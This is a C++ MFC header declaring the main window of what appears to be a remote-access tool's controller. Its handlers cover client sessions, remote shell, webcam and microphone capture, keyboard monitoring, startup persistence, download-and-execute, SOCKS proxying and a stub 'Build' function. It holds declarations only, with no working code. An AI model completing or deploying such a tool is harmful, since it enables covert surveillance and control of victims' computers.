
// MainFrm.h : CMainFrame 类的接口
//

#pragma once
#include "ClientList.h"
#include "Config.h"

#define VIEW_SHOW_CLIENLIST	1
#define VIEW_SHOE_LOG		2

#define SRV_STATU_STARTING	0			//正在开启
#define SRV_STATU_STARTED	1			//已经开启
#define SRV_STATU_STOPPING	2			//正在关闭
#define SRV_STATU_STOPPED	3			//已经关闭


class CIOCP;
class CServer;

class CMainFrame : public CFrameWnd
{
public:
	CMainFrame(CIOCP *Iocp);

	
protected: 
	DECLARE_DYNAMIC(CMainFrame)

// 特性
public:

// 操作
public:

// 重写
public:
	virtual BOOL PreCreateWindow(CREATESTRUCT& cs);
// 实现
public:
	virtual ~CMainFrame();
#ifdef _DEBUG
	virtual void AssertValid() const;
	virtual void Dump(CDumpContext& dc) const;
#endif

private:  // 控件条嵌入成员
	CStatusBar        m_wndStatusBar;
	////日志
	//CFont			  m_LogFont;
	//CEdit			  m_Log;
	//客户列表
	CClientList		  m_ClientList;

	DWORD			  m_View;
	DWORD			  m_ServerStatu;
	////
	CIOCP*			  m_Iocp;
	CServer *	      m_pServer;
	
	CConfig			  m_config;
	//
	unsigned int	  m_listenPort;
// 生成的消息映射函数
protected:
	afx_msg int OnCreate(LPCREATESTRUCT lpCreateStruct);
	afx_msg void OnSetFocus(CWnd *pOldWnd);
	DECLARE_MESSAGE_MAP()

	//void Log(CString text);
public:
	CConfig& Config(){
		return m_config;
	}
	afx_msg void OnPaint();

	afx_msg void OnTimer(UINT_PTR nIDEvent);
	afx_msg void OnMainStartserver();
	afx_msg void OnUpdateMainStartserver(CCmdUI *pCmdUI);

	afx_msg void OnUpdateStatuBar();

	////服务器开启和关闭后会通知该窗口
	//afx_msg LRESULT OnSrvStarted(WPARAM wResult, LPARAM lNoUsed);
	//afx_msg LRESULT OnSrvStopped(WPARAM wNoUsed, LPARAM lNoUsed);

	//当有socket连接的时候通过该函数来初始化Handler
	afx_msg LRESULT OnClientLogin(WPARAM wParam,LPARAM lParam);

	afx_msg void OnClose();
	afx_msg void OnMainExit();
	//Control:
	afx_msg void OnSessionDisconnect();
	afx_msg void OnSessionUninstall();
	afx_msg void OnPowerShutdown();
	afx_msg void OnPowerReboot();
	afx_msg void OnOperationEditcomment();

	afx_msg void OnUpdateMainExit(CCmdUI *pCmdUI);
	afx_msg void OnOperationCmd();
	afx_msg void OnOperationChatbox();
	afx_msg void OnOperationFilemanager();
	afx_msg void OnOperationRemotedesktop();
	afx_msg void OnOperationCamera();
	afx_msg void OnSessionRestart();
	afx_msg void OnOperationMicrophone();


	afx_msg void OnMainBuild();
	afx_msg void OnMainSettings();
	afx_msg void OnOperationKeyboard();
	afx_msg void OnUtilsAddto();
	afx_msg void OnUtilsCopytostartup();
	afx_msg void OnUtilsDownloadandexec();
	afx_msg void OnProxySocksproxy();
	afx_msg void OnSessionExit();
	afx_msg void OnUtilsOpenwebpage();
	afx_msg void OnSize(UINT nType, int cx, int cy);



	afx_msg void OnOperationProcessmanager();
	afx_msg void OnRemotedesktopDxgi();
	afx_msg void OnRemotedesktopGdi();
};


